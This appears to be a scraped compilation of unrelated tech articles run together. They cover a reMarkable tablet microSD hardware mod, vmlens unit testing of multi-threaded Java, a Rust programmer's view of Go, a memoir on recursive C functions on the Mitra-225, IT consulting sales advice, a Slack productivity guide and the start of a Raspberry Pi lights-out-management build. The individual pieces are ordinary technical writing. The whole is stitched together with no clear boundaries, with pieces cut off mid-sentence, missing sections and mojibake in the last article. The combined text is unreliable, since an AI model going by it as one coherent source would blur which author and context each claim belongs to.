CONFIG_CRYPTO_AEAD=y
CONFIG_CRYPTO_GF128MUL=y
CONFIG_CRYPTO_NULL=y
CONFIG_CRYPTO_CCM=y
CONFIG_CRYPTO_GCM=y
CONFIG_CRYPTO_SEQIV=y
CONFIG_CRYPTO_CTR=y
CONFIG_CRYPTO_GHASH=y
CONFIG_CRYPTO_ARC4=y
</pre>
<p>
Once done, rebuild the Linux kernel with <code>make</code>. Copy the artifacts to the rM's <code>/boot</code> directory: <code>arch/arm/boot/dts/zero-gravitas.dtb</code> and <code>arch/arm/boot/zImage</code>. I have included my artifacts <a href="http://www.davisr.me/projects/remarkable-microsd/boot.tar">here</a> for posterity, but it is foolish to install a kernel that someone else compiled.<br>
</p><p>
Reboot the rM, to make sure xochitl still runs. Then, check <code>dmesg | grep
 ‘mmc0’</code> to ensure the card was detected, and double-check it with <code>fdisk 
-l</code>. Partition your card as you like, then change the /etc/fstab option 
to mount that partition at /home.
</p>
<pre>root@reMarkable:~# dmesg | grep mmc0

/dev/mmcblk0p7 /home auto defaults,nofail 1 2
</pre>
<p>
Reboot, and bask in the increased storage capacity.

<ul>
<li>Now, the aluminum back is held on with gaffer tape. I am afraid to glue it shut, in case I want to access the guts again.
</li><li>Maybe the white stuff that came out around the bezel can be replaced with calk</li><li>I wish I had used multicolor wires, because it was difficult following them with my eyes.
</li><li>I didn’t cut close enough to the top of the plastic case, and 
so my SD slot is taller than it needs to be, but it isn't very 
noticable. I shimmed the extra vertical space with a folded up business 
card for a tighter fit.
</li><li>Before using solid-core wirewrap wire, I tried making my own 
ribbon cable with magenet wire and masking tape. This didn’t work well, 
because the enamel was hard to remove from just the ends, and the 
masking tape was too thick. The wirewrap wire turned out much nicer.
</li><li>Technically, I think the IMX needs to be changed too (and 
re-wrote over /dev/mmcblk1boot0) but I didn’t do this, and it seems to 
work alright. I'm fine using it just for the data partition so my OS updates work.
</li>
<li>I am glad this article has created encouragement from other people. I
 would like to extend an offer: if you would like a microSD card in your
 rM, and are willing to let me install one with the possibility of it 
not coming out exactly perfect (i.e. someone who finds ultimate use of 
rM in its utility, not pristine beauty) I would like to refine this 
process. One thing could be to install an internal card using quality 
flash media. I would like to know how many people could go for something
 like that, and if there could be a market doing that kind of thing. I 
will soon have installed my own CNC machine, and can practice doing this
 modification better, eventually charging for the service.<br>

<![CDATA[A new way to unit test multi-threaded Java]]>

August 21, 2020 | https://vmlens.com/articles/ct/new_way_to_test/ | <a href="https://web.archive.org/web/*/https://vmlens.com/articles/ct/new_way_to_test/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
<div>
      <p>Unit-testing multi-threaded Java seams impossible. Bugs depend on the specific timing of the threads and sometimes even on the specific processor type or JVM. But by using byte-code transformations it is possible to test all thread interleavings for a given unit test.</p>
<p>I have implemented those transformations in <a href="https://vmlens.com/">the open-source tool vmlens.</a></p>

<p>The number of current CPU cores is growing exponentially. While it took four years to go from two cores to eight in the year 2009, it took only one year to go from 32 to 64 in the year 2018.  The following figure shows the growth of cores for server CPUs. To utilize all those cores we need scalable, multi-threaded software.</p>
<p><img src="https://vmlens.com/img/articles/scale/developmentOfCoreCountOfServerCPUs.png"></p>

<p>The JVM offers numerous techniques, frameworks, and open source libraries for multi-threaded programming. You can use threads, Executors, the ForkJoin framework, parallel streams, actors, to name a few of them. But until now, it was not possible to write a unit test for multi-threaded software. So to <a href="https://pragprog.com/tips/">test early, test often, test automatically</a> was not possible. And also techniques that require unit tests like re-factoring or test-driven design.</p>

<p>But by using byte-code transformations, it is now possible to test all thread interleavings. The idea is to use an automatic test and re-run the test for each possible thread interleaving using vmlens. The following example shows this for a unit test using java.util.concurrent.ConcurrentHashMap to collect statistics. You can download the example <a href="https://github.com/vmlens/vmlens-examples">from GitHub here.</a></p>
<pre>import com.vmlens.api.AllInterleavings;
public class TestUpdateWrong {
	public void update(ConcurrentHashMap&lt;Integer, Integer&gt; map) {
		Integer result = map.get(1);
		if (result == null) {
			map.put(1, 1);
		} else {
			map.put(1, result + 1);
		}
	}
	@Test
	public void testUpdate() throws InterruptedException {
		try (AllInterleavings allInterleavings = 
				new AllInterleavings("TestUpdateWrong");) {
			while (allInterleavings.hasNext()) {
				final ConcurrentHashMap&lt;Integer, Integer&gt; map = 
						new ConcurrentHashMap&lt;Integer, Integer&gt;();
				Thread first = new Thread(() -&gt; {
					update(map);
				});
				Thread second = new Thread(() -&gt; {
					update(map);
				});
				first.start();
				second.start();
				first.join();
				second.join();
				assertEquals(2, 
				  map.get(1).intValue());
			}
		}
	}
}</pre>
<p>The test uses two threads to update the ConcurrentHashMap. Each test run uses a new map and new threads. After a test run, we check if both threads incremented the counter inside the map. To test all thread interleavings we put the complete test in a while loop iterating over all thread interleavings using the class <a href="https://vmlens.com/apidocs/api/1.0/com/vmlens/api/AllInterleavings.html">AllInterleavings.</a></p>
<p>The test fails with the error message:</p>
<pre>Failures: 
  TestUpdateWrong.testUpdate:45 expected:&lt;2&gt; but was:&lt;1&gt;</pre>
<p>The test fails because for one interleaving the two threads first both get null out of the map. And then both threads insert one into the map.</p>
<p>When running the test, you need to make sure that vmlens is added as Java-agent to the JVM. You can either do this by using maven, <a href="https://vmlens.com/help/manual/#running-tests-maven">as described here</a>, or by using eclipse, <a href="https://vmlens.com/help/manual/#run-eclipse">as described here</a>.</p>

<p>How can we calculate all thread interleavings? The idea is to identify all atomic and instantly visible operations and method calls. And to execute all combinations of those operations and method calls. Well not all, only those which can lead to a different outcome. In our example test, the methods get and set from ConcurrentHashMap are atomic and instantly visible. To calculate all possible thread interleavings is possible as long as our test is data race free. Therefore we check for each interleaving if the test run is data race free.</p>
<p>Data races are incorrect synchronized reads and writes to the same memory location from different threads. When a data race happens and when an application is correctly synchronized is defined in the Java Memory Model.</p>
<p>That we can use such a two-step approach for testing is no surprise but rather a <a href="https://vmlens.com/articles/cp/java_memory_model_enables_tests/">consequence of the Java Memory Model</a>.</p>

<p>Testing multi-threaded software by executing all thread interleavings is not new. The tool <a href="https://concuerror.com/">Concuerror</a> implements this approach for the language Erlang, a programming language without shared memory. Finding data races at runtime is also not new. A prominent example is <a href="https://github.com/google/sanitizers/wiki/ThreadSanitizerCppManual">ThreadSanitizer which detects data races in C++ programs</a> and <a href="https://blog.golang.org/race-detector">golang</a> and <a href="https://openjdk.java.net/jeps/8208520">Java</a>.</p>
<p>New is the combination of those two techniques to test Java, a language with shared memory.</p>

<p>O.k. so we calculated all thread interleavings and know for which interleaving a test failed. We can show this interleaving in a report. This makes debugging of the failed test possible, almost for free. Here is the interleaving which led to the failure of the example test:</p>
<p><img src="https://vmlens.com/img/help/readModifyWriteWithoutTitle.png"></p>
<p>In case of the failure, both threads first call get. And then both threads call put. So the second thread overwrites the value of the first thread.</p>

<p>By using byte-code transformations, vmlens makes it possible to test all thread interleavings for a given unit test. To calculate all potential thread interleavings is possible since we check that the given unit test is data race free.</p>
<p>We can take an automatic test and surround it by a while loop iterating over all thread interleavings. Unit testing makes it possible to test early, test often, test automatically even for multi-threaded code. And to apply techniques like refactoring and test-driven design to multi-threaded code.</p>

            <section>
                <!--kg-card-begin: markdown--><p>This post was originally published on the <a href="https://pingcap.com/blog/early-impressions-of-go-from-a-rust-programmer/">PingCAP blog</a>.</p>
<p>I've been using <a href="https://en.wikipedia.org/wiki/Go_(programming_language)">Go</a> for the past few weeks. It's my first time using Go for a large (-ish), serious project. I've previously looked at Go a lot and played with examples and toy programs when researching features for <a href="https://en.wikipedia.org/wiki/Rust_(programming_language)">Rust</a>. Real programming is a very different experience.</p>
<p>I thought it would be interesting to write about my impressions. I'll try and avoid too much comparison with Rust, but since that is the language I'm coming from, there will be some. I should declare in advance a strong bias for Rust, but I'll do my best to be objective.</p>
<h2 id="generalimpression">General impression</h2>
<p>Programming with Go is nice. It had everything I wanted in the libraries and there were not too many rough edges. Learning it was a smooth experience, and it is a well-designed and practical language. Some examples: once you know the syntax, many idioms from other languages carry over to Go. Once you've learned some Go, it is relatively easy to predict other features. With some knowledge of other languages, I was able to read Go code and understand it without too much googling.</p>
<p>It is a lot less frustrating and a lot more productive than using C/C++, Java, Python, etc. It did feel, however, like part of that generation of languages. It has learnt some lessons from them, and I think it is probably the best language of that generation; but it is definitely part of that generation. It is an incremental improvement, rather than doing something radically different (to be clear, this is not a value judgement, incremental is often good in software engineering). A good example of this is <code>nil</code>: languages like Rust and Swift have removed the concept of <code>null</code> and eliminated a whole class of errors. Go makes it a bit less dangerous: no null <em>values</em>, distinguishes between <code>nil</code> and <code>0</code>. But the core idea is still there, and so is the common runtime error of dereferencing a null pointer.</p>
<h2 id="learnability">Learnability</h2>
<p>Go is incredibly easy to learn. I know this is an often-touted benefit, but I was really surprised how quickly I was able to be productive. Thanks to the language, docs, and tools, I was writing 'interesting', commit-able code after literally two days.</p>
<p>A few factors contributing to learnability are:</p>
<ul>
<li>Go is small. Lots of languages try to be small, Go really is small; really small. (This is mostly a good thing and I'm impressed with the discipline this must have taken).</li>
<li>The standard library is good (and again, small). Finding and using libraries from the ecosystem is very easy.</li>
<li>There is very little in the language which is not in other languages. Go takes lots of bits from other established languages, polishes them, and puts them together nicely. It tries very hard to avoid novelty.</li>
</ul>
<h2 id="boilerplate">Boilerplate</h2>
<p>Go code becomes very repetitive very quickly. It is missing any mechanism like macros or generics for reducing repetition (interfaces are nice for abstraction, but don't work so well to reduce code duplication). I often end up with lots of functions, identical except for types.</p>
<p>Error handling also causes repetition. Many functions have more <code>if err != nil { return err }</code> boilerplate than interesting code.</p>
<p>Using generics or macros to reduce boilerplate is sometimes criticised for making code easy to write at the expense of making it harder to read. But I found the opposite with Go. It is quick and easy to copy and paste code, but reading Go code is frustrating because you have to ignore so much of it or search for subtle differences.</p>
<h2 id="thingsilike">Things I like</h2>
<ul>
<li>Compile times. Definitely quick; definitely a lot quicker than Rust. But not actually as quick as I was expecting (it feels to me to be similar to or a little faster than C/C++ for medium to large projects, I was kind of expecting instant).</li>
<li>Go routines and channels. Having lightweight syntax for spawning Go routines and using channels is really nice. It really shows the power of syntax that such a small detail makes concurrent programming feel so much nicer than in other languages.</li>
<li>Interfaces. They're not very sophisticated but they are easy to understand and use, and useful in a lot of places.</li>
<li><code>if ...; ... { }</code> syntax. Being able to restrict the scope of variables to the body of <code>if</code> statements is nice. This has a similar effect to <code>if let</code> in Swift and Rust, but is more general purpose (Go does not have pattern matching like Swift and Rust, so it cannot use <code>if let</code>.</li>
<li>Testing and doc comments are easy to use.</li>
<li>The <code>Go</code> tool is nice - having everything in one place rather than requiring multiple tools on the command line.</li>
<li>Having a garbage collector (GC)! Not thinking about memory management really does make programming easier.</li>
<li>Varargs.</li>
</ul>
<h2 id="thingsididnotlike">Things I did not like</h2>
<p>In no particular order.</p>
<ul>
<li><code>nil</code> slices - <code>nil</code>, a <code>nil</code> slice, and an empty slice are all different. I'm pretty sure you only need two of those things, not three.</li>
<li>No first class enums. Using constants feels backwards.</li>
<li>Disallowing import cycles. This really limits how useful packages are for modularising a project, since it encourages putting lots of files in a package (or having lots of small packages, which can be just as bad if files which should be together are not).</li>
<li><code>switch</code> may be non-exhaustive.</li>
<li><code>for ... range</code> returns a pair of index/value. Getting just the index is easy (just ignore the value) but getting just the value requires being explicit. This seems back-to-front to me since I need the value and not the index in most cases.</li>
<li>Syntax:
<ul>
<li>Inconsistency between definitions and uses.</li>
<li>Pickiness of the compiler (e.g., requiring or forbidding trailing commas); this is mostly alleviated by good tooling, but there a still a few times when this creates an annoying extra step.</li>
<li>When using multiple-value return types, parentheses are required on the type, but not in the <code>return</code> statement.</li>
<li>Declaring a struct requires two keywords (<code>type</code> and <code>struct</code>).</li>
<li>Using capitalisation for marking variables public or private. It's like Hungarian notation but worse.</li>
</ul>
</li>
<li>Implicit interfaces. I know I have this on my thing I like list too, but sometimes it is really annoying - e.g., trying to find all types which implement an interface, or which interfaces are implemented for a given type.</li>
<li>You can't write functions with a receiver in a different package, so even though interfaces are 'duck typed' they can't be implemented for upstream types making them much less useful.</li>
</ul>
<p>I've already mentioned the lack of generics and macros above.</p>
<h2 id="consistency">Consistency</h2>
<p>As a language designer and a programmer, probably the thing that most surprised me about Go is the frequent inconsistency between what is built-in and what is available to users. It has been a goal of many languages to eliminate as much magic as possible, and make built-in features available to users. Operator overloading is a simple, but controversial, example. Go has a lot of magic! And you very easily run into the wall of not being able to do things that built-in stuff can.</p>
<p>Some things that stood out to me:</p>
<ul>
<li>There is nice syntax for returning multiple values and for channels, but the two cannot be used together because there are no tuple types.</li>
<li>There is a <code>for ... range</code> statement for iterating over arrays and slices, but you can't iterate over other collections because there is no concept of iterators.</li>
<li>Functions like <code>len</code> and <code>append</code>, are global, but there is no way to make your own functions global. Those global functions only work with built-in types. They can also be generic, even though Go has 'no generics'!</li>
<li>There is no operator overloading, this is particularly annoying with <code>==</code> because it means you can't use custom types as keys in a map unless they are <em>comparable</em>. That property is derived from the structure of a type and can't be overridden by the programmer.</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Go is a simple, small, and enjoyable language. It has some odd corners, but is mostly well-designed. It is incredibly fast to learn, and avoids any features which are not well-known in other languages.</p>
<p>Go is a very different language to Rust. Although both can vaguely be described as systems languages or 'replacements' for C, they have different goals and applications, styles of language design, and priorities. Garbage collection is a really huge differentiator. Having GC in Go makes the language much simpler and smaller, and easy to reason about. Not having GC in Rust makes it <em>really</em> fast (especially if you need guaranteed latency, not just high throughput), and enables features and programming patterns which are not possible in Go (or at least not without sacrificing performance).</p>
<p>Go is a compiled language with a well-implemented runtime. It is fast. Rust is also compiled, but has a much smaller runtime. It is <em>really fast</em>. Assuming no other constraints, I think the choice between using Go and Rust is a trade-off between a much shorter learning curve and simpler programs (which means faster development), versus Rust being really, really fast, and having a more expressive type system (which makes your programs safer and means faster debugging and error hunting).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="a3034387"><p><b>Memoir 1 - Recursive functions in C and the only time I was brilliant</b></p><p>Some time around 1988 I wanted to port UNIX to ES-1011, a hungarian clone of <a href="http://www.feb-patrimoine.com/english/mitra.htm">Mitra-225</a>. It was a 16-bit+ mini with an accumulator-based instruction set, and unlike its contemporary PDP-11, it had no hardware-supported stack.</p>
<p>Our ES-1011 ran OS <a href="https://k001.livejournal.com/397810.html?thread=2309106">MISS</a>, written by late <a href="https://zaitcev.livejournal.com/249725.html">Vladimir Butenko</a>, including a C compiler by <a href="https://www.linkedin.com/in/mark-venguerov-7a6a1/">Mark Venguerov</a>. Mark found it somewhat annoying implementing a stack. His prologue routine had 22 instructions and epilogue had something like 9. The K&amp;R C also had a non-trivial prologue function, called '.jsav' IIRC. But it wasn't as bad as having a word in memory work as a stack pointer on Mitra-225/ES-1011.</p>
<p>Because entering functions properly was so expensive, Mark made a decision not to make all functions recursive by default. Instead, those that needed to be recursive were marked with a reserved word "recursive". It was expected that not many needed it. The problem was how to find those that did and mark them. I didn't do that, but I think someone developed a program that searched for potential call loops (perhaps Ivan Bobrov or Sasha Ovsyankin did). Even so it was rather iffy to identify and tag recursion.</p>
<p>Before I started porting, I consulted with <a href="http://kotovnik.com/~avg/old_page/">Vadim Antonov</a>, who was basically King of Unix in USSR. His suggestion was to start with developing the ABI and calling convention. I don't remember if he pointed it out, or if I decided it myself, but Mark's explicit recursion was a non-starter. I began looking into the problem and had an idea.</p>
<p>Mitra-225 had an additional register, L, which was possible to read in userspace. I think it pointed at the word where the return address was saved. The instruction set featured a few rarely used addressing modes with L as an index register. Also, a procedure return instruction set L as a side effect, as I recall. Either way, I decided to use L as a frame pointer. I coded a somewhat unconventional prologue that recovered the return address and previous value of L, then re-set L so it continued to point into stack, and pushed return address there. It only took something like 9 instructions. The epilog was even smaller and it was basically RET. The code was compact and performant enough to allow all C functions to be recursive, as they should.</p>
<p>When I demonstrated the code to Mark, he looked at me for a long moment and said: "Where have you been before, Pete?"</p>
<p>By that time, he was busy with his 2nd C compiler, for 8086, and he never got back to retool the C for Mitra. And I burned out of porting UNIX for one reason or other. My diploma theses was porting MISS to PDP-11, ironically enough. So, nothing came out of my craftiness.</p>
<p>Next: <a href="http://zaitcev.mee.nu/memoir_002">Memoir 2</a>.</p>
<p>Update: There's a manual for Mitra-15 floating on the Internet, so I used it to refresh my memory somewhat. The L register is loaded from a global "section table" upon a procedure call (CLS: Call Section). This hardware support and traditional use make a reason why nobody came upon the obvious. But the procedure return (RTS) is recursion-friendly: it loads the return address from L+0 and the L from L+2.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><div><div itemprop="text"><p>I've worked in IT consulting for over 10 years in various roles. My current job includes meeting with prospects and discussing our IT services and how they fit into their business. This has been the first position I've held where I deal with a lot more of the business side and sales of IT Consulting.  </p>
<p>One thing has become very apparent in meetings with prospects. <strong>You have to treat every meeting as if this is your one and only shot. You cannot assume that this is just merely an introduction and later on in subsequent meetings you will be able to present more in depth information</strong>. If you have a visual presentation or any type a hard copy documentation you want to present, you have to present it in this meeting.  </p>
<p>A good example of this- A while ago a former colleague reached out to me and we discussed how my current employer and I could help them. Everything sounded great and initially we discussed a quick meeting to go over some of the very basics of how my firm is structured and our support options. I thought of this meeting as merely an introduction and the first step in the process of winning them over as a client. We had the meeting and I answered all their questions. A couple weeks went by and I hadn’t heard anything so I followed up with my former colleague. He informed me that they decided to go with another provider.  </p>
<p>At first I was a bit surprised because It seemed like a really good fit. There were a couple of outside forces that ultimately made them choose the other firm but one thing that he did mention is that the other provider delivered an entire presentation about their services and how they operate. This is when the alarm bells really went off and I ultimately felt like I squandered this opportunity. I have a presentation however I was planning on presenting that in a second meeting with my management team.  </p>
<p>After going through this and losing out on this potential client I have learned to treat every opportunity as if it’s my last and I have much better results with this mindset. There definitely have been times where I have had an initial introduction however we are going into it with the proper mindset and treating it as if it’s my one and only opportunity , It’s lead into second and possibly even additional meetings with other management and or teams in the organization.  </p>
<p>Consulting sales and MSP sales can a treacherous endeavor . Hope this helps give you some perspective or insight and helps someone along the way.</p>

professional work into deep and shallow work. Deep work can be described as
follows.</p><blockquote><p>“Professional activities performed in a state of distraction-free
concentration that push your cognitive capabilities to their limit. These
efforts create new value, improve your skill, and are hard to replicate.”</p></blockquote><p>Shallow work is the opposite.</p><blockquote><p>“Non-cognitively-demanding, logistical-style tasks, often performed while
distracted. These efforts tend to not create much new value in the world and
are easy to replicate.”</p></blockquote><p>For us knowledge workers, the value we provide is in the creative work we do,
such as coding, designing experiences, or building companies. Maximizing time
spent in a state of deep work can have an outsized impact on our unique
contributions.</p><p>The COVID-19 pandemic has accelerated the shift to remote work, a change that
will have lasting consequences. One is the replacement of traditional in-person
communication with digital tools like Slack.</p><p>This drastic change has already destabilized workdays and anecdotally, has
increased both the number of times people open up Slack during the workday and
the total amount of time spent using Slack. While utilizing tools like Slack is
critical to our jobs, most of us can safely categorize that usage as shallow
work.</p><p>Therefore, there is a real danger of spending significantly more time in the
shallows, reducing professional output and career progression.</p><h2 id="slack-and-its-immense-flexibility">Slack, and its immense flexibility</h2><p><a href="https://slack.com/">Slack</a>&nbsp;is an incredibly powerful tool that is undoubtedly
crucial to the functioning of many businesses today. That power stems from its
sheer flexibility. It’s a single source of truth, unlike email, where knowledge
is spread out over inboxes. It supports both real-time and asynchronous
communication. It plugs into other services, making it a hub for operations. It
grows with companies as they expand. There isn’t one right way to use Slack,
which is precisely one of its biggest strengths. Join different Slack teams, and
you’ll see how differently they can function.</p><h2 id="the-achilles-heel-of-general-purpose-technology">The Achilles heel of General-purpose technology</h2><p>Slack’s flexibility is also its biggest weakness. Out of the box, it doesn’t
force a specific way of using it. Why is that a bad thing? Let’s look at an
example.</p><p>A traditional tool like a saw is designed for a particular purpose. When I need
to cut something, I reach for my saw and use it as intended. When I don’t need
it, it sits among my other tools.</p><p>The story is different with multi-purpose tools like the personal computer or
the smartphone. Most of us purchased a smartphone wanting to keep up with
family, navigate around town, or take photographs. However, over time, we’ve
downloaded some games or social networking apps. We’ve started to carry our
phone into the bathroom. What began as a pure utility, has become a source of
distraction.</p><p>The only way to fight this is by being deliberate and not letting our whims
decide how we use our tools. With the smartphone, that means strictly limiting
which apps we install and when we pull out our phone. It means building a strict
separation between work and play.</p><p>The same is true with Slack and other communication tools. If we aren’t
deliberate about what value we want to receive from these tools, our impulses
will decide.</p><p>Slack isn’t immune from dopamine-fueled addiction that is common with social
media services and games. The variable reward (variable both in timing and in
the content of the incoming messages) that we receive when opening up Slack can
lead to&nbsp;<a href="https://en.wikipedia.org/wiki/Compulsion_loop">compulsion loops</a>. I’ve
observed myself opening up Slack to kill time just like I would do by playing a
mobile game or checking a social media feed.</p><h2 id="the-deep-work-guide-to-slack">The deep work guide to Slack</h2><p>Here’s my guide to how knowledge workers today can use Slack while being more
productive and preventing it from taking over their lives.</p><p><strong>Caveat:</strong>&nbsp;I’m assuming here that you are a knowledge worker whose profession
doesn’t require timely responses to incoming messages. If you are a firefighter
or customer service representative, then most of what I’m saying here probably
won’t apply to you. Also, if you are in a role that requires significant
coordination or management, then some of what I’m saying here may ring true, but
some of it may not.</p><h3 id="have-a-separate-todo-list">Have a separate todo list</h3><p>We can easily run our days from Slack, treating it as a todo list. Slack shares
that trap with other communication tools like email. Using inboxes as todo lists
presents a high likelihood of working on shallow work while neglecting the deep,
impactful work.</p><p>A necessary part of being productive on Slack is having a separate todo list and
a productivity system for organizing our deep work. It can be as simple as a
sticky note or a text file. Whatever method you choose, make sure it is free of
distractions.</p><h3 id="batching-and-time-boxing">Batching and time boxing</h3><p>To prevent compulsion loops, scheduling Slack usage. Instead of filling the
margins between meetings and working sessions, schedule it just like a meeting.
Prevent Slack from interrupting deep work and remove the possibility of
introducing&nbsp;<a href="https://memory.ai/timely-blog/attention-residue">attention residue</a>&nbsp;that
can severely slow you down.</p><p>The dedicated time box also creates a space to process slack messages properly.
If you check Slack in the 5 minutes between two meetings, you likely won’t have
enough time to address the messages and will have to come back to them anyway.</p><p>I schedule time twice a day to check Slack and email 30 minutes at a time. Do
what works best for you.</p><h3 id="pull-not-push">Pull, not push</h3><p>The second behavior I find useful is using Slack with a pull strategy.</p><p>Traditional telephones are a form of push communication. When the sender wants
to relay a message, they decide when to contact the receiver and interrupt
whatever they happen to be doing at the moment.</p><p>Mail, on the other hand, is a pull system. Senders can send letters at any time.
However, the receiver chooses when to read their mail.</p><p>For most of us, the advantage of instant contact with push communication doesn’t
justify the cost of interruptions and distractions. So, use Slack with a pull
strategy.</p><p>For this to work, you need to remove the possibility of interruptions and
increase the friction of checking Slack. Here are the steps I follow:</p><ol><li>Use Slack only in the browser on a computer. If you can’t do that, quit the
app between uses or, better yet, uninstall it. I find that having the app
open can quickly shift me into a casual browsing mode without even realizing
it. Also, don’t use the mobile application unless you need access everywhere
you go.</li><li>Remove notifications and icon badges — mute sounds. Since you’ll be checking
Slack regularly at predetermined times, sounds and notifications no longer
serve any purpose. If you are concerned about being available during an
emergency, then provide an alternate means of contact like your mobile
number.</li></ol><p><span>

fall into the trap of joining a large number of channels that may have minimal
impact on our work.</p><p>Every month or so, go through your channel list and leave any channel that
doesn’t have a meaningful impact.</p><p>For channels that we don’t want to leave, muting is another excellent option.
Muted channels still appear in the sidebar, but without prominent badges. So, we
can still browse them as messages come in.</p><p><span>

    </span></p><p>The first step is to collapse every section that you can, dramatically reducing
the sidebar’s amount of noise.</p><p><span>

    </span></p><p>Next, go to the Channels, Direct messages, and Apps sections and switch them to
only showing unread messages.</p><p><span>
      <span></span>

    </span></p><p>This step does have the disadvantage of making channels and direct messages harder to find when composing a new message. However, there is the channel browser for browsing all channels. Furthermore, the shortcuts&nbsp;<span>⌘ + K</span> and <span>⌘ + T</span> open up a spotlight-style search bar to jump to nearly anything within Slack.</p><p>To take it further, I reduce the visual prominence of the badges denoting unread
messages. You can do that by customizing your Slack theme and turning the
usually red dots a more muted color. I use my own theme based on the color
palette used on this site.</p><p><span><iframe src="https://player.vimeo.com/video/449531948?background=1" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="" title="vimeo video"></iframe></span></p><p>Use my theme by copying the code below into Slack under

visual clutter within message threads. I find this helps me process messages in
the order they arrive instead of letting visuals attract my eye.</p><p>In <code>Preferences &gt; Messages and Media</code>, switch the theme from Clean to Compact,
which removes profile photos and makes timestamps more prominent.</p><p>Also, uncheck all settings related to inline media and links, which hides them
behind a click.</p><p><span><iframe src="https://player.vimeo.com/video/449199248?background=1" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="" title="vimeo video"></iframe></span></p><h3 id="read-messages-in-a-queue">Read messages in a queue</h3><p>This last step is the most important. To reduce the amount of cognitive overhead
in using Slack, treat it like a queue address and tasks in the order they are
received.</p><p>Doing this makes it dead simple to process a large number of messages and
prevents the scenario where some messages lay unanswered while other newer ones
are processed.</p><p>To consume Slack messages as a queue, the first step is to make sure that the
“Show All Unreads” option is checked in the preferences.</p><p><span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="https://zach.bloomqu.ist/assets/pilo-naked.jpg" alt="Pilo board before final tape-up"> <small>The completed Pilo controller, before final installation. The USB capture card and Arduino Nano USB serial are soldered to the underside of the 3B+.</small></p> <p>Like many geeks, I have a â€œhome serverâ€� made from off-the-shelf, consumer-grade PC parts, from which I run my weekend programming projects, game servers for friends, this website, and so on. Recently, I had a power event at the house that caused the server to reboot. When the power came back on, the server booted, but it was stuck at the boot screen waiting for me to enter the disk decryption passphrase!</p> <p>Luckily, I was at home and asleep at the time. Once I woke up and realized something was amiss, I was able to plug in a keyboard and enter the passphrase. But this event got me thinking - what if I wasnâ€™t home at the time? What if I was in another country? What if someday, I move this server outside of my house and need to regularly access the physical screen and keyboard?</p> <p>In the â€œreal serverâ€� world, the solution to this is known as <a href="https://en.wikipedia.org/wiki/Out-of-band_management">â€œlights-out managementâ€� (LOM)</a>. Every major server manufacturer has their own flavor of this, such as HPâ€™s iLO (Integrated Lights-Out). There are even industry standards like <a href="https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface">IPMI</a> that define common interfaces for LOM implementations. Commonly supported functions for LOM systems include:</p> <ul> <li>Controlling keyboard and mouse input</li> <li>Controlling power button status (so you can restart, shutdown, force offâ€¦)</li> <li>Seeing the raw video output from the motherboard (even pre-boot - even for BIOS)</li> <li>Mounting ISOs as disks</li> </ul> <p>I decided to make my own Raspberry Pi-based LOM that can do some of these things, to help decrease my stress next time I leave my house for an extended period of time. Iâ€™d like to introduce Pilo - â€œPi Lights-Outâ€�.</p> <blockquote> <p>Note: This post describes how I arrived at the final design of this system. If you just want the instructions for setting this up on your own, start reading at â€œTutorialâ€�.</p> </blockquote> <h2 id="building-the-keyboard-controller">Building the Keyboard Controller</h2> <p>When I started looking for ways to use my Pi to send keyboard commands to a computer, the problem I discovered was that all of the existing methods rely on <a href="http://www.isticktoit.net/?p=1383">using the Raspberry Pi Zero as a USB host</a>, which disables using the onboard USB port for other purposes. Additionally, this method does not work on other boards, like the Raspberry Pi 3B+. This was problematic, because I wanted to use the 3B+ due to the on-board Ethernet - that, and the fact that I had one kicking around from a previous <a href="https://pi-hole.net/">Pi-hole</a> deployment.</p> <p>A more suitable solution would be to emulate a keyboard via the GPIO pins of the Pi. This would theoretically not affect existing USB devices, and could be used on any model of Pi, not just the Pi Zero. So I started looked into trying to <a href="http://www.jargon.net/jargonfile/b/bitbang.html">â€œbit-bangâ€�</a> the USB Human Interface Device protocol via the Piâ€™s GPIO pins.</p> <p>I pretty quickly hit a dead end with that. There are <a href="https://raspberrypi.stackexchange.com/q/82850/100317">many</a>, <a href="https://www.element14.com/community/thread/38228/l/raspberry-pi-usb-output-from-gpio">many</a> existing discussions on the web about bit-banging the USB protocol on the Pi. The consensus seems to be that the Raspberry Piâ€™s GPIO is too slow to emulate USB, and even if it <em>could</em> output bits fast enough to act as a USB device, the implementation would be extremely buggy because of the non-real-time nature of the Linux OS (<a href="https://raspberrypi.stackexchange.com/a/87865/100317">read more</a>).</p> <p>But USB isnâ€™t the only way to send keypresses to a computer - almost a decade before the USB standard was a twinkle in Compaqâ€™s eye, IBM was using the <a href="https://en.wikipedia.org/wiki/PS/2_port">PS/2</a> standard (not to be confused with the <a href="https://en.wikipedia.org/wiki/PlayStation_2">PS2</a>) to connect mice and keyboards to PCs. Itâ€™s still not feasible to use the Pi to bit-bang the PS/2 protocol, but we can use an Arduino as a daughterboard, and the <a href="https://github.com/Harvie/ps2dev"><code>ps2dev</code></a> library can handle the nitty-gritty of the serial protocol for PS/2.</p> <p><img src="https://zach.bloomqu.ist/assets/pilo-pin-jam.jpg" alt="Left: Arduino soldered up. Right: Breadboard jumpers jammed into the PS/2 port"></p> <p>So thatâ€™s what I did. The Arduino Nano pictured on the left is plugged directly into the PS/2 combo port on the back of the motherboard (ignore the unused 5V wire, red). Originally, I planned on cutting the end off of a PS/2 cable and making it all nice, but the Goodwill near me didnâ€™t have any PS/2 junk and it turns out that breadboard wires just fit oh-so-snugly into the DIN holes. So this is how itâ€™s gonna be.</p> <p>The Arduino Nano is flashed with a <a href="https://create.arduino.cc/editor/flotwig__/093ababe-c724-476f-aeb8-a76b239bf192/preview">short program</a> that makes it act as a dumb pipe which blindly shuttles bytes from the Arduinoâ€™s USB serial port to the PS/2 connection on the motherboard. This means that all of the logic for which keyboard commands should be sent has to be written on the Pi-side, which is nice, because it means that we should never have to re-flash the Arduino to update some keyboard logic.</p> <p>Note that currently, Pilo is only built to control keyboard input, since it is oriented towards server use. It would be possible to add PS/2 mouse output with no additional hardware, just 2 or 3 wires for PS/2 mouse CLK, DATA, and GND (unless using combo port). The <a 